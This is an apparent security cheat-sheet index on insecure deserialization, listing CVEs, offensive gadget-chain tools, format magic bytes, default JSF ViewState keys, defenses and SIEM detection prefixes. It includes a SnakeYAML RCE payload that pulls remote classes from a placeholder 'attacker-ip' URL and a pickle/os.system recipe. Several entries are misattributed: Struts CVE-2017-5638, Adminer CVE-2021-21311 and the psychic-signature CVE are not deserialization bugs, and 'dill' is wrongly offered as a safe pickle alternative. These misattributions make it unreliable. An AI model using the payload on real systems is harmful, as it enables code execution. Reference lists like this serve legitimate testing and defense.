# Insecure Deserialization — Resources

## OWASP

- A08:2021 Software and Data Integrity Failures
- OWASP Cheat Sheet — Deserialization — https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- OWASP Web Security Testing Guide — Deserialization Testing
- OWASP ASVS V12 (Files) and V14 (Configuration)

## CWE

- CWE-502 — Deserialization of Untrusted Data
- CWE-913 — Improper Control of Dynamically-Managed Code Resources
- CWE-915 — Improperly Controlled Modification of Dynamically-Determined Object Attributes (mass assignment overlap)

## Notable CVEs

### Java
- CVE-2015-4852 — Oracle WebLogic
- CVE-2017-5638 — Apache Struts 2 (Equifax breach)
- CVE-2019-0192 — Apache Solr
- CVE-2019-2725 — Oracle WebLogic
- CVE-2017-7525 — Jackson + TemplatesImpl
- CVE-2017-17485 — Spring FileSystemXmlApplicationContext
- CVE-2019-12384 — Logback JDBC INIT script RCE
- CVE-2020-36180 — Apache DBCP2
- CVE-2023-46604 — ActiveMQ OpenWire (port 61616)

### PHP
- CVE-2015-8562 — Joomla PHP object injection
- CVE-2019-16759 — vBulletin unserialize
- CVE-2024-2961 — PHP filter chain RCE (glibc iconv)

### .NET
- CVE-2019-1010024 — .NET binary formatter
- CVE-2020-1147 — .NET XAML

### Ruby / Python / Node
- CVE-2013-0156 — Rails YAML deserialization
- CVE-2021-21311 — Adminer (PHP)
- CVE-2017-1000353 — Jenkins (Java)
- CVE-2022-21449 — Java psychic signature

## Tools

### Java

- **ysoserial / ysoserial-all** — gadget chain generator — https://github.com/frohoff/ysoserial
- **marshalsec** — protocol-specific gadgets — https://github.com/mbechler/marshalsec
- **GadgetProbe** — chain detection
- **Java Deserialization Scanner** (Burp BApp)
- **Freddy** (Burp BApp) — deserialization bug finder
- **jexboss** — JBoss / Java
- **InYourFace** — JSF ViewState patcher

### PHP

- **PHPGGC** — gadget chain generator — https://github.com/ambionics/phpggc
- **Synacktiv php_filter_chain_generator** — https://github.com/synacktiv/php_filter_chain_generator
- PHAR builder scripts

### .NET

- **ysoserial.net** — https://github.com/pwntester/ysoserial.net
- **DeepBlueCLI** — defensive scanner

### Python / Ruby

- Custom `__reduce__` payload generation
- `pickle.dumps` + `os.system` / `subprocess`
- Ruby `Marshal.dump` / `YAML.load` chains
- **Universal Ruby Marshal gadget** — Gem::RequestSet (2.x-3.x)

### General

- **Freddy** (Burp BApp) — multi-language deserialization
- **.NET Beautifier and Minifier** (Burp BApp)
- **Java Deserialization Scanner** (Burp BApp)

## Format detection

| Language | Magic Bytes | Base64 Prefix |
|----------|-------------|---------------|
| PHP | N/A | `Tzo`, `Tz`, `YTo` |
| Java | `AC ED 00 05` | `rO0` |
| Ruby | `04 08` | `BAh` |
| .NET | `00 01 00 00` | `AAEAAA` |
| Python pickle 3 | `80 03` | `gAN` |
| Python pickle 4 | `80 04` | `gAR` |

## Common gadget chains

### Java
- CommonsCollections1-7 (Apache Commons Collections)
- CommonsBeanutils1
- Spring1, Spring2
- Groovy1
- C3P0
- Hibernate1, Hibernate2
- ROME
- Vaadin1
- JRMPClient (RMI)
- URLDNS (out-of-band probe)

### PHP (PHPGGC)
- Symfony/RCE4, Symfony/RCE7
- Laravel/RCE1, Laravel/RCE9
- Monolog/RCE1
- Guzzle/RCE1
- SwiftMailer/FW1
- Doctrine/FW1
- Slim/RCE1

### .NET (ysoserial.net)
- TypeConfuseDelegate
- ObjectDataProvider
- PSObject
- WindowsIdentity

## JSF ViewState — hardcoded secrets

| Algorithm | Base64 secret |
|---|---|
| DES | `NzY1NDMyMTA=` |
| DESede | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
| AES CBC | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
| AES CBC/PKCS5 | `NzY1NDMyMTA3NjU0MzIxMA==` |
| Blowfish | `NzY1NDMyMTA3NjU0MzIxMA` |

## SnakeYAML RCE payload

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/"]
  ]]
]
```

## Practice / labs

- Web Security Academy — Deserialization — https://portswigger.net/web-security/deserialization
- TryHackMe — Insecure Deserialization rooms
- DVWA, OWASP WebGoat

## Defensive references

- **Java**: ObjectInputFilter (Java 9+), allowlist of accepted classes
- **PHP**: `unserialize($data, ['allowed_classes' => [...]])`, disable Phar
- **Python**: never `pickle.loads()` on untrusted data; use JSON or `dill` with hooks
- **Ruby**: `YAML.safe_load` instead of `YAML.load`
- **.NET**: avoid `BinaryFormatter`; use `System.Text.Json` or `protobuf`
- **General**: signed payloads (HMAC), JWT, MessagePack, Protobuf, Avro

## SIEM / detection

- Splunk / ELK — base64 prefix patterns (`rO0`, `Tzo`, `BAh`, `gAN`, `AAEAAA`) in request bodies
- ModSecurity rules tagged deserialization
- AV scanners with deserialization rules
- WAF (Cloudflare / Imperva) — known gadget signatures

## Bug bounty programs

- HackerOne — Java / .NET enterprise programs frequently expose deser flaws
- Bugcrowd — multiple deserialization disclosures
- Self-hosted — Spring / Tomcat / WebLogic targets

## Cheat-sheet companions in this repo

- `scenarios/deserialization/php-deserialization.md`
- `scenarios/deserialization/java-deserialization.md`
- `scenarios/deserialization/python-and-ruby.md`
- `scenarios/deserialization/dotnet-deserialization.md`
